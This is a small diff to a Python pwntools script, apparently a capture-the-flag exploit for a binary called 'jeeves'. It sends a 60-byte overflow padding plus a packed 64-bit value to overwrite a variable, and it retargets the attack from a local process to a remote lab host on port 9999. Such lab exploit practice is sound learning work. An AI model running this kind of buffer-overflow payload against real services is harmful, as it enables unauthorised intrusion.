@@ -1,9 +1,10 @@
-from pwn import *
+import pwn
 
-payload = 'A' * 60 + pwn.p64(0x1337bab3)
+payload = b'A' * 60 + pwn.p64(0x1337bab3)
 
-io = process("./jeeves")
-io.sendlineafter('name? ', payload)
+#io = pwn.process("./jeeves")
+io = pwn.remote('10.10.10.10', 9999)
+io.sendline(payload)
 
 
-io.interactive()
+#io.interactive()
